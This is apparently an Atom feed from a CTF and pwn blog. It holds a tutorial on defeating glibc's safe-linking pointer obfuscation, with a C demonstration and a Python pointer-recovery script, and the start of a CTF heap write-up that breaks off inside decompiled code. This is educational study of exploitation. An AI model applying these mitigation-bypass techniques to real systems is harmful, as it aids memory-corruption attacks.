<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lexsd6&#39;s home</title>
  
  <subtitle> Clumsy birds have to start flying early</subtitle>
  <link href="lexsd6.github.io/atom.xml" rel="self"/>
  
  <link href="lexsd6.github.io/"/>
  <updated>2022-10-16T13:57:16.833Z</updated>
  <id>lexsd6.github.io/</id>
  
  <author>
    <name>lexsd6</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>how2heap-decrypt_safe_linking学习</title>
    <link href="lexsd6.github.io/2022/10/16/decrypt_safe_linking/"/>
    <id>lexsd6.github.io/2022/10/16/decrypt_safe_linking/</id>
    <published>2022-10-16T12:11:27.356Z</published>
    <updated>2022-10-16T13:57:16.833Z</updated>
    
    <content type="html"><![CDATA[<p>在2.32glibc中，新增的防护之指针异或加密机制到 fastbin 和 tcache 当中，将 pos &gt;&gt; 12 后的值 key，与原来的 next 进行异或，作为新的 next 值。</p><h2 id="新机制说明"><a href="#新机制说明" class="headerlink" title="新机制说明"></a>新机制说明</h2><p><img src="image-20221016145439852.png" alt="image-20221016145439852"></p><p>以free函数为例子，在2.32glibc中在释放chunk时 不是直接把 fd 值放入 <code>p-&gt;fd</code>中。而是经过 <code>PROTECT_PTR</code>或 <code>REVEAL_PTR</code>处理。 <code>PROTECT_PTR</code>和 <code>REVEAL_PTR</code>在宏定义中定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the "next" pointers of the</span></span><br><span class="line"><span class="comment">   lists' chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p><code>PROTECT_PTR</code>和 <code>REVEAL_PTR</code> 使用ASLR（mmap_base）的随机性来保护单链接列表Fast Bins和TCache。也就是说，屏蔽列出块，并对其执行分配对齐检查。这种机制降低了指针劫持的风险，就像对在小箱子的双重链接列表中安全断开链接。它假定最小页面大小为4096字节（12位）。具有的系统较大的页面提供较少的熵，尽管指针会被破坏仍然有效.用一个官方例子来描述:</p><p><img src="libc_figure_6.png" alt="libc_figure_6"></p><p>即 <strong>tcache_entry-&gt;next中存放的chunk地址为与自身地址进行异或运算后所得到的值</strong>， 这就要求我们在利用 tcache_entry 进行任意地址写之前 <strong>需要我们提前泄漏出相应 chunk 的地址，即我们需要提前获得堆基址后才能进行任意地址写</strong>，这给传统的利用方式无疑是增加了不少的难度.</p><h2 id="how2heap-decrypt-safe-linking手法分析"><a href="#how2heap-decrypt-safe-linking手法分析" class="headerlink" title="how2heap-decrypt_safe_linking手法分析"></a>how2heap-decrypt_safe_linking手法分析</h2><p>在how2heap提供了一个<code>decrypt_safe_linking.c</code>的例子让我们在新机制下获得 fastbin 和 tcache的真实fd。</p><p>但是我觉得例子不过深刻于是魔改了下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"because of the 12bit sliding."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)"</span>);</span><br><span class="line"><span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> plain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line"><span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"round %d:\n"</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"key:    %#016lx\n"</span>, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"plain:  %#016lx\n"</span>, plain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"cipher: %#016lx\n\n"</span>, cipher);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment"> * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment"> * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment"> * and the key (ASLR slide) is the same to the pointer's leading bits.</span></span><br><span class="line"><span class="comment"> * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment"> * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment"> * Otherwise, we can also recover the pointer with the page-offset between the storer</span></span><br><span class="line"><span class="comment"> * and the pointer. What we demonstrate here is a special case whose page-offset is 0. </span></span><br><span class="line"><span class="comment"> * For demonstrations of other more general cases, plz refer to </span></span><br><span class="line"><span class="comment"> * https://github.com/n132/Dec-Safe-Linking</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 1: allocate chunks</span></span><br><span class="line"><span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *c = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"First, we create chunk a @ %p and chunk b @ %p\n"</span>, a, b);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"And then create a padding chunk to prevent consolidation."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2: free chunks</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Now free chunk a and then free chunk b."</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the freelist is: [%p -&gt; %p]\n"</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Due to safe-linking, the value actually stored at b[0] is: %#lx\n"</span>, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3: recover the values</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Now decrypt the poisoned value"</span>);</span><br><span class="line"><span class="keyword">long</span> plaintext = decrypt(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"value: %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"recovered value: %#lx\n"</span>, plaintext);</span><br><span class="line">assert(plaintext == (<span class="keyword">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h3><p>1.我们先创建4个chunk和一个隔离chunk，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step 1: allocate chunks</span></span><br><span class="line"><span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *c = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p><img src="16658363725510.png" alt="img"></p><p>2。然后我们释放一个chunk a。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(a);</span><br></pre></td></tr></table></figure><p><img src="image-20221015202118323.png" alt="image-20221015202118323"></p><p>可以看 加入了tcachebins 且fd 处存放的不是0，而是  0x555555559 （右移12位）</p><p>3.继续依次 c  d b 释放后 chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p><img src="image-20221015202508995.png" alt="image-20221015202508995"></p><p>ps：可以看 b c d 的fd ，与0x555555559 后，就是真正的fd的</p><p><img src="1665836803212.png" alt="img"></p><p>3.对d chunk的fd 进行 decrypt 函数解密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"because of the 12bit sliding."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)"</span>);</span><br><span class="line"><span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> plain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line"><span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"round %d:\n"</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"key:    %#016lx\n"</span>, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"plain:  %#016lx\n"</span>, plain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"cipher: %#016lx\n\n"</span>, cipher);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到6就循环后，d chunk的fd 的真实fd就还原过来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">round 1:</span><br><span class="line">key:    0000000000000000</span><br><span class="line">plain:  0000000000000000</span><br><span class="line">cipher: 0x0055500000cd89</span><br><span class="line"></span><br><span class="line">round 2:</span><br><span class="line">key:    0x00000550000000</span><br><span class="line">plain:  0x00550000000000</span><br><span class="line">cipher: 0x0055500000cd89</span><br><span class="line"></span><br><span class="line">round 3:</span><br><span class="line">key:    0x00000555550000</span><br><span class="line">plain:  0x00555550000000</span><br><span class="line">cipher: 0x0055500000cd89</span><br><span class="line"></span><br><span class="line">round 4:</span><br><span class="line">key:    0x00000555555550</span><br><span class="line">plain:  0x00555555550000</span><br><span class="line">cipher: 0x0055500000cd89</span><br><span class="line"></span><br><span class="line">round 5:</span><br><span class="line">key:    0x00000555555559</span><br><span class="line">plain:  0x005555555598d0</span><br><span class="line">cipher: 0x0055500000cd89</span><br></pre></td></tr></table></figure><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>从上面的例子可以看出，fd 位置存放值就是 原本fd的值（前一个tache的真实地址）右移 12位与fd 位置的地址值。但由于我们只 12位原本fd的值，因此我们还有3个地址位是原本的。又异或可逆性，我们可以将没变的3个地址位或2个地址右移 12位与上fd 位置存放值，还原出原本 fd一部分值 高4-6位。在把原本 fd一部分与旧原本 fd一部分再右移 12位与上fd 位置存放值，又可以得到一部分原本fd值。<img src="image-20221016213012185.png" alt="image-20221016213012185">因此我们可以更具异或可逆性，慢慢还原出来。</p><p>python版脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0055500000cd89</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    key=<span class="number">0</span></span><br><span class="line">    plain=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        bits= <span class="number">64</span><span class="number">-12</span>*(i+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span>(bits&lt;<span class="number">0</span>):</span><br><span class="line">            bits=<span class="number">0</span></span><br><span class="line">        plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits</span><br><span class="line">        key = plain &gt;&gt; <span class="number">12</span></span><br><span class="line">        print(<span class="string">"round %d:\n"</span>%(i))</span><br><span class="line">        print(<span class="string">"key:    %#016lx\n"</span>%key)</span><br><span class="line">        print(<span class="string">"plain:  %#016lx\n"</span>%plain)</span><br><span class="line">        print(<span class="string">"cipher: %#016lx\n\n"</span>%cipher)</span><br><span class="line"></span><br><span class="line">decrypt(<span class="number">0x0055500000cd89</span>)</span><br></pre></td></tr></table></figure><h2 id="后记思考"><a href="#后记思考" class="headerlink" title="后记思考"></a>后记思考</h2><p>其实若是第一个tache 那么放入fd 的值就是 (fd^0)&gt;&gt;12.</p><p>同时，7个 连续小于等于0x240的tache或fast bin 的间地址差不会超过0x1000.</p><p>因此泄露出第一个tache的fd里的值为keys，直接与其他tache的fd相与。就可以得到原址。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>在uclibc-ng中引入的补丁：<a href="https://gogs.waldemar-brodkorb.de/oss/uclibc-ng/commit/886878b22424d6f95bcdeee55ada72049d21547c" target="_blank" rel="noopener">https://gogs.waldemar-brodkorb.de/oss/uclibc-ng/commit/886878b22424d6f95bcdeee55ada72049d21547c</a>  就是在取p-&gt;fd和存放p-&gt;fd时都改成调用REVEAL_PTR</p><p><a href="https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/" target="_blank" rel="noopener">https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/</a>  机制介绍</p><p><a href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation" target="_blank" rel="noopener">https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation</a> 机制绕过</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在2.32glibc中，新增的防护之指针异或加密机制到 fastbin 和 tcache 当中，将 pos &amp;gt;&amp;gt; 12 后的值 key，与原来的 next 进行异或，作为新的 next 值。&lt;/p&gt;
&lt;h2 id=&quot;新机制说明&quot;&gt;&lt;a href=&quot;#新机制说明&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2022川渝职业技能竞赛初赛--hard_login</title>
    <link href="lexsd6.github.io/2022/10/02/2022%E5%B7%9D%E6%B8%9D%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B--hard_login/"/>
    <id>lexsd6.github.io/2022/10/02/2022%E5%B7%9D%E6%B8%9D%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B--hard_login/</id>
    <published>2022-10-02T01:21:50.195Z</published>
    <updated>2022-10-02T03:06:38.523Z</updated>
    
    <content type="html"><![CDATA[<p>太久没有做堆题了，突然做一道感觉还挺有意思的(主要全都忘完了/(ㄒoㄒ)/~~)<a id="more"></a></p><h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><p>UAF</p><p>unsorted bin（glibc 2.31）</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目是经典的堆题，给了2.31的libc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>分析代码，分析提供四个功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp-14h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v7 = v3;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        show_info((__int64)&amp;v7);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        find_password();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">delete</span>((__int64)&amp;v7);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>1.添加功能（add）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE v5[<span class="number">6</span>]; <span class="comment">// [rsp-26h] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp-24h] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( id = <span class="number">0</span>; id &lt;= <span class="number">9</span> &amp;&amp; chunk_state_check[<span class="number">4</span> * id]; ++id )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( id == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your ID:%d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Info size:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">size</span> &lt;= <span class="number">0x7F</span> || <span class="built_in">size</span> &gt; <span class="number">0x500</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    chunk_state_check[<span class="number">4</span> * id] = <span class="built_in">size</span>;</span><br><span class="line">    v1 = id;</span><br><span class="line">    *((_QWORD *)&amp;chunk + <span class="number">2</span> * v1) = <span class="built_in">malloc</span>(<span class="built_in">size</span> + <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)&amp;chunk + <span class="number">2</span> * id) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your name:"</span>, &amp;<span class="built_in">size</span>);</span><br><span class="line">    v2 = *((_QWORD *)&amp;chunk + <span class="number">2</span> * 